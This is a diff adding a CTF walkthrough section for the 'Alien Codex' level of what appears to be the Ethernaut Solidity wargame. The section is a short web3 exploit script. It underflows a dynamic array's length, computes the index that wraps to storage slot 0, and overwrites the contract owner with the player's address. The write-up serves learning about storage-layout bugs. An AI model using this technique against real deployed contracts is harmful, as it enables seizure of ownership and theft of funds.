@@ -173,3 +173,29 @@ const contractBytes = "0x600A600C600039600A6000F3602A60005260206000F3";
 const solverContract = await web3.eth.sendTransaction({ from: player, data: contractBytes });
 await contract.setSolver(solverContract.contractAddress);
 ```
+
+
+## 19. Alien Codex
+
+See [Collisions of Solidity Storage Layouts](https://mixbytes.io/blog/collisions-solidity-storage-layouts).
+```
+await contract.make_contact();
+await contract.retract(); // use underflow to make all 2^256 storage slots accessible via 'codex' array
+
+/* Storage slot layout:
+    0: owner (address), contact (bool)
+	1: codex.length (uint256)
+	.
+	.
+	.
+	keccak256(1): codex[0] (bytes32)
+	.
+	keccak256(1)+i: codex[i] (bytes32)
+*/
+const uint256_range = web3.utils.toBN(2).pow(web3.utils.toBN(256)); // 2^256
+const codex_offset = web3.utils.toBN(web3.utils.soliditySha3(1)); // 1 is the storage slot of 'codex[]'
+const storage0_relative_to_codex = uint256_range.sub(codex_offset); // compute index of storage slot 0 relative to 'codex[]'
+const storage0_new_content = "0x000000000000000000000001" + player.slice(2); // build 32 bytes hex string with player address and 'contact = true'
+
+await contract.revise(storage0_relative_to_codex, storage0_new_content); // replace contract owner with player
+```
